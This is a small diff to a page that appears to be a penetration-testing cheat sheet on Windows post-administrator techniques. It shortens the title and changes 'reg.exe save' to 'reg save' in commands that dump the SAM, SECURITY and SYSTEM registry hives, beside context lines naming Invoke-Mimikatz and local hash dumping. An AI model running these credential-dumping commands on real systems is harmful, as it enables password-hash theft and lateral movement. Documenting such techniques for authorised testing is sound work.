@@ -1,10 +1,10 @@
 ---
 layout: default
-title: Windows Post-Admin
+title: Windows
 parent: Post-Admin/Root
 ---
 
-# Windows Post-Admin
+# Windows
 {: .no_toc }
 
 ## Table of contents
@@ -72,9 +72,9 @@ Invoke-Mimikatz -ComputerName
 ## Registry Dump
 Dump SAM, SECURITY and SYSTEM registry hives
 ```powershell
-reg.exe save hklm\sam <output path>
-reg.exe save hklm\security <output path>
-reg.exe save hklm\system <output path>
+reg save hklm\sam <output path>
+reg save hklm\security <output path>
+reg save hklm\system <output path>
 ```
 
 Dump hashes on local machine
